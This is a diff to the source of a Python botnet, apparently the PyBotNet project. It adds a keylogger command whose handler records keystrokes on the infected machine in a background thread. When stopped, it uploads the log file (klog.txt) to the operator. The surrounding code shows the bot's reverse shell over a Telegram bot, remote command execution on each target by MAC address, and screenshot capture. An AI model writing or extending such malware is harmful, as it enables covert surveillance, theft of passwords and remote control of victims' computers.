@@ -1,11 +1,12 @@
 '''Defult PyBotNet scripts'''
+import enum
 import re
 import os
 import subprocess
 import requests
+import threading
 from typing import List
 from time import sleep
-
 from uuid import getnode as get_system_mac_addres
 from requests import get
 
@@ -14,6 +15,8 @@ from . import util
 from . import settings
 
 MAC_ADDRES = str(get_system_mac_addres())
+keylogger_thread = None
+keylogger_util = None
 
 scripts_name = {
     MAC_ADDRES: "`<system MAC_ADDRES> <command>`: run command on one target",
@@ -36,6 +39,8 @@ scripts_name = {
 
     "/start": "`/start`: run `help` command!",
 
+    "keylogger": "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger" ,
+
     "reverse_shell": "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system"
 }
 
@@ -55,7 +60,6 @@ def is_command(command) -> bool:
     if command_name in scripts_name:
         return True
     return False
-
 
 def reverse_shell(is_shell, ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger):
     ''' start reverse shell on target system and send response in telegram bot '''
@@ -125,6 +129,7 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
             elif command_name == 'ls':
                 return execute_ls(command, logger)
 
+
             elif command_name == 'cd':
                 return execute_cd(command, logger)
 
@@ -142,7 +147,9 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
 
             elif command_name in ['reverse_shell']:
                 return reverse_shell(is_shell, ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger)
-
+            
+            elif command_name == "keylogger" and split_command(command)[1] in ['start','stop']:
+                return keylogger(logger,command)
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
@@ -405,6 +412,42 @@ def screenshot(logger):
     else:
         logger.error('script.screenshot in util.screenshot_pil Failed')
         return 'get screenshot Failed'
+
+
+def keylogger(logger,command):
+    global keylogger_util,keylogger_thread
+    """checks if command[1] is off or on. if on , a thread to start keylogging will start 
+    if off , keylogger thread will stop. this function will handle multiple keyloggers running."""
+    keylogger_thread_name = "keylog" # for threading , this way we can prevent multiple keyloggers running at the same time
+    # if user requested keylogger to be turned on
+    if split_command(command)[1] == 'start':
+        keylogger_util = util.KeyLogger()
+        if keylogger_thread_name in (i.name for i in threading.enumerate()):
+            logger.error('keylogger is already turned on')
+            return 'keylogger is already turned on'
+        logger.info('turning keylogger on...')
+        keylogger_thread = threading.Thread(target=keylogger_util.start,name=keylogger_thread_name)
+        keylogger_thread.start()
+        keylogger_thread.join()
+        logger.info('keylogger turned on.')
+        return 'Key logger turned on.'
+    
+    # if user requested keylogger to be turned off
+    if split_command(command)[1] == 'stop':
+        try:
+            keylogger_thread.join()
+            keylogger_util.stop()
+            data = upload_manager("klog.txt",logger)
+            if data[0] == False:
+                return 'upload failed'
+            else:
+                return 'keylogger off. logger txt file => {0}'.format(data[1])
+        except:
+            return 'keylogger is already off.'
+        
+
+
+
 
 
 def command_help(logger):
